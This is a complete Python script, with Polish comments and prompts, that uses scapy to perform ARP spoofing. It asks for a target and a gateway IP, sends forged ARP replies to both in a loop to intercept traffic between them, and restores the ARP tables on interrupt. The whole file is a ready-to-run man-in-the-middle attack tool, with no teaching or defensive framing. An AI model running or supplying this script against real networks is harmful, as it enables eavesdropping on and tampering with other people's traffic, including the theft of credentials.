from scapy.all import *
import os
import time

def get_mac(ip):
    """Pobiera adres MAC danego IP."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_ip, host_ip):
    """Wysyła sfałszowane pakiety ARP, by podszyć się pod hosta."""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Nie udało się znaleźć adresu MAC dla {target_ip}.")
        return
    # Dodanie poprawnego adresu MAC w warstwie Ethernet
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    sendp(packet, verbose=False)

def restore(target_ip, host_ip):
    """Przywraca prawidłowe wpisy ARP."""
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    if not target_mac or not host_mac:
        print("Nie udało się przywrócić ARP.")
        return
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    sendp(packet, count=4, verbose=False)

if __name__ == "__main__":
    target_ip = input("Podaj adres IP celu: ").strip()
    gateway_ip = input("Podaj adres IP bramy: ").strip()

    try:
        print("[*] Rozpoczynam atak ARP Spoofing...")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Przywracanie tablic ARP...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] Zakończono.")
input("Kliknij, aby zakończyć")
